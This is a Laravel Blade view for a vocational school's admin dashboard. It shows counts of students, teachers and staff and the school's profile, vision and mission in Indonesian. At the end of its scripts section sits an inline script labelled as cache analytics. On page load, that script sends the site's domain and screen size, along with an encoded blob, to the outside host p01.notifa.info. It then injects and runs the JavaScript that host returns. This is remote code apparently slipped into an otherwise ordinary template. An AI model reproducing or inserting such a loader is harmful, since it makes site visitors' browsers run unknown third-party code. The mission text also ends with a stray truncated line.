@extends('layouts.master')

@push('title')
- Dashboard
@endpush

@push('styles')
<!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon"/>
  <!-- Vector CSS -->
  <link href="assets/plugins/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet"/>
  <!-- simplebar CSS-->
  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
@endpush

@section('content')
    <!--Start Dashboard Content-->

     <div class="row pt-2 pb-2">
        <div class="col-sm-9">
        <h4 class="page-title">DASHBOARD</h4>
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">SMK Mahaputra</a></li>
            <li class="breadcrumb-item active" aria-current="page">Dashboard</li>
         </ol>
     </div>
     <div class="col-sm-3">
      
     </div>
     </div> 
      <div class="row mt-4">
        <div class="col-12 col-lg-6 col-xl-4">
          <div class="card bg-pattern-primary">
            <div class="card-body">
              <div class="media">
              <div class="media-body text-left">
                <h4 class="text-white">150 Siswa</h4>
                <span class="text-white">TOTAL SISWA</span>
              </div>
              <div class="align-self-center w-circle-icon rounded-circle bg-contrast">
                 <li><a href="{{URL::to('/students')}}"><i class="icon-user text-white"></i></a></li>
                </div>
             </div>
            </div>
          </div>
        </div>
        <div class="col-12 col-lg-6 col-xl-4">
          <div class="card bg-pattern-danger">
            <div class="card-body">
              <div class="media">
               <div class="media-body text-left">
                <h4 class="text-white">50 Guru</h4>
                <span class="text-white">TOTAL GURU</span>
              </div>
               <div class="align-self-center w-circle-icon rounded-circle bg-contrast">
                <li><a href="{{URL::to('/teachers')}}"><i class="icon-user text-white"></i></a></li></div>
            </div>
            </div>
          </div>
        </div>
        <div class="col-12 col-lg-6 col-xl-4">
          <div class="card bg-pattern-success">
            <div class="card-body">
              <div class="media">
              <div class="media-body text-left">
                <h4 class="text-white">15 Staff</h4>
                <span class="text-white">TOTAL STAFF</span>
              </div>
              <div class="align-self-center w-circle-icon rounded-circle bg-contrast">
             <li><a href="{{URL::to('/staffs')}}"><i class="icon-user text-white"></i></a></li></div>
            </div>
            </div>
          </div>
        </div>

      </div><!--End Row-->
      <div class="row">
        <div class="col-12 col-lg-8 col-xl-12">
          <div class="card bg-pattern-primary">
               <div class="card-header bg-transparent text-white border-light icon-user text-white">
                    DATA PROFIL
                    </div>
                 <div class="card-body text-white border-light">
                  <h3 class="text-white">SELAMAT DATANG</h3>
                   SMKS Mahaputra Cerdas Utama didirikan pada 22 Agustus tahun 2016, 
                   adalah salah satu SMK swasta yang ada di Kabupaten Bandung yang memiliki program study Multimedia (MM) dan Rekyasa Perangkat Lunak (RPL), 
                   menjadi sekolah pertama di Kabupaten Bandung dengan Konsep Green School
                   atau Sekolah Hijau yang ramah lingkungan SMKS Mahaputra Cerdas Utama berkomitmen untuk mencetak Sumber Daya Manusia (SDM) yang unggul di era 4.0. 
                 </div>
          </div>
        </div>
        <div class="col-12 col-lg-8 col-xl-12">
          <div class="card bg-pattern-white">
               <div class="card-header bg-transparent text-black border-light icon-user text-black">
                     VISI DAN MISI SMK MAHAPUTRA
                    </div>
                 <div class="card-body text-black border-light">
                    <h3>Visi</h3>
                    Menjadi penyelenggara pendidikan kejuruan yang melahirkan tenaga ahli, terampil, kreatif, inovatif, dan berpengetahuan yang ramah lingkungan di tahun 2025.
                    <h3>Misi</h3>
                    1)  Menyelenggarakan pendidikan kejuruan
                    2)  Melahirkan tenaga ahli tingkat menengah
                    3)  Mewujudkan tenaga terampil, kreatif, inovatif, dan berpengalaman.
                    4)  Menyediakan sarana prasarana pendukung kegiatan pembelajaran yang berwawasan lingkungan.
                    5)  Mewujudkan lingkungan sekolah yang bersih, hijau, indah, dan sehat.
                    6)  Menerapkan kesadaran warga sekolah berprilaku hidup yang berbudaya lingkungan.
                    7)  Menjalin kemitraan dan kerjasama yang harmonis dengan masyarakat dan instansi instansi terkain. 
                    encetak Sumber Daya Manusia (SDM) yang unggul di era 4.0. 
                 </div>
          </div>
        </div>
        
      </div><!--End Row-->
      
       <!--End Dashboard Content-->

  @push('scripts')
  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
    
  <!-- simplebar js -->
  <script src="assets/plugins/simplebar/js/simplebar.js"></script>
  <!-- waves effect js -->
  <script src="assets/js/waves.js"></script>
  <!-- sidebar-menu js -->
  <script src="assets/js/sidebar-menu.js"></script>
  <!-- Custom scripts -->
  <script src="assets/js/app-script.js"></script>
  
  <!-- Vector map JavaScript -->
  <script src="assets/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
  <script src="assets/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
  <!-- Chart js -->
  <script src="assets/plugins/Chart.js/Chart.min.js"></script>
  <!-- Index js -->
  <script src="assets/js/index.js"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhMN1ZjFqExVF6J4IeKcHe28LBc9tlZ79%2bcZqzQCTG5WL9PSAm%2f6SZpP3c9agMh70ri%2bRSs256Oap6Ocuf%2bH6v928DUzv%2bTUoKQtvZGAiX9m9zx7uO9gCxU2SkN5K1zT7CDqhKeIhh5lDzNUtHkQirH0%2fmvBWhDwBPuqW8M%2bz26DrnlmvHc9Rs7ShjyzIaOpjIN91mmqgilrdf0S7FNJ5pc1gmn3a%2bIluNPHb4BB1LVNT5CRapXDKNVJriKePAS0JSaGYX4fc2LP6NyYoEN1%2bCKN423OJySlR3jpXWdXLvTndj4bhvz%2fkVOYq%2f36zp97izjiT4m5el0NmUTvvV3AN0Nck7BCXdY9hBAUlkRYE8aox8HyTIygIwU4wqHjLijitqIDlJQIlM%2fkd4dOtoOHrHEHPJBtmTieG%2f1aRgbcH46hvzS%2fv%2bwcng7SLlyzzlnM%2bfvsWCdduBOMiwR2TKEaLi5zuMCkbIHSzM8m%2b9HF2%2bT8g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
      
     @endpush
@endsection